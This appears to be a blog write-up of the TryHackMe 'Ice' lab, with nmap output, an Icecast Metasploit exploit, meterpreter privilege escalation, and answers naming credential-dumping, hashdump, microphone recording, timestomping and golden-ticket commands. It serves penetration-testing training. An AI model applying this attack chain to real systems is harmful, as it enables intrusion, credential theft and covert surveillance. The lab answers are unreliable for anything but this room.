---
title: Try Hack Me - ccpentesting
layout: post
category: writeup
---

# Try Hack Me: ICE
```
export IP=10.10.201.119
```

## Task 2 [recon]

```
nmap -oN nmap.init.out -sC -sV -A -T4 -p- $IP
```

```
Nmap scan report for 10.10.201.119
Host is up (0.11s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-05-21T04:28:37+00:00; 0s from scanner time.
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http               Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
Network Distance: 2 hops
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 1h15m00s, deviation: 2h30m00s, median: 0s
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:59:6e:ff:11:54 (unknown)
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-05-20T23:28:28-05:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-05-21T04:28:28
|_  start_date: 2020-05-21T03:26:10

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   114.00 ms 10.11.0.1
2   114.08 ms 10.10.201.119

```


1. What port is MSRDP?
```
3389
```

2. What service is running on port 8000?
```
Icecast
```

3. What is the hostname of the machine?
```
DARK-PC
```

## Task 3 [gain access]

```
searchsploit icecast
```

```
-------------------------------------------------------------------------- -----------------------------------------
 Exploit Title                                                            |  Path
                                                                          | (/opt/exploit-database/)
-------------------------------------------------------------------------- -----------------------------------------
Icecast 1.1.x/1.3.x - Directory Traversal                                 | exploits/multiple/remote/20972.txt
Icecast 1.1.x/1.3.x - Slash File Name Denial of Service                   | exploits/multiple/dos/20973.txt
Icecast 1.3.7/1.3.8 - 'print_client()' Format String                      | exploits/windows/remote/20582.c
Icecast 1.x - AVLLib Buffer Overflow                                      | exploits/unix/remote/21363.c
Icecast 2.0.1 (Win32) - Remote Code Execution (1)                         | exploits/windows/remote/568.c
Icecast 2.0.1 (Win32) - Remote Code Execution (2)                         | exploits/windows/remote/573.c
Icecast 2.0.1 (Windows x86) - Header Overwrite (Metasploit)               | exploits/windows_x86/remote/16763.rb
Icecast 2.x - XSL Parser Multiple Vulnerabilities                         | exploits/multiple/remote/25238.txt
icecast server 1.3.12 - Directory Traversal Information Disclosure        | exploits/linux/remote/21602.txt
-------------------------------------------------------------------------- -----------------------------------------
Shellcodes: No Results
```

1. What type of vulnerability is present in the running version of Icecast?
```
execute code overflow
```

2. What is the CVE number of this vuln?
```
CVE-2004-1561
```

4. What is the full path for the exploit module in metasploit?
```
exploits/windows/http/icecast_header
```

6. What is the required exploit module setting?
```
rhosts
```

## Task 4 [escalate]

```
meterpreter > getuid
Server username: Dark-PC\Dark
```

```
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.201.119 - Collecting local exploits for x86/windows...
[*] 10.10.201.119 - 31 exploit checks are being tried...
[+] 10.10.201.119 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.201.119 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.201.119 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.201.119 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.201.119 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.201.119 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.201.119 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.201.119 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.201.119 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

1. Whats the name of the resulting shell?
```
meterpreter
```

2. What user is running the Icecast process?
```
Dark
```

3. What build of Windows is the system?
```
7601
```

4. What is the architecture of the process we are running?
```
x64
```


6. What is the full path for the first returned exploit suggsted by the local_exploit_suggester?
```
exploit/windows/local/bypassuac_eventvwr
```

10. What is the name of the one option that needs to be changed?
```
LHOST
```

14. What permission did we gain that allows us to take ownership of files?
```
SeTakeOwnershipPrivilege
```

## Task 5 [looting]

2. What is the name of the printer service?
```
spoolsv.exe
```

4. What user are we now?
```
NT AUTHORITY\SYSTEM
```

7. Which command allows us to retrieve all credentials (kiwi)?
```
creds_all
```

8. What is Dark's password?
```
Password01!
```

## Task 6 [post-exploitation]

2. What is the command to dump all password hashes on the system?
```
hashdump
```

3. What command allows us to watch the remote users desktop in realtime?
```
screenshare
```

4. Record from a microphone from the system?
```
record_mic
```

5. What command allows us to modify timestamps of files on the system?
```
timestomp
```

6. What mimikatz command creates a "golden ticket" for authentication to kerberos?
```
golden_ticket_create
```

## Task 7 [extra credit]

ouch, my brain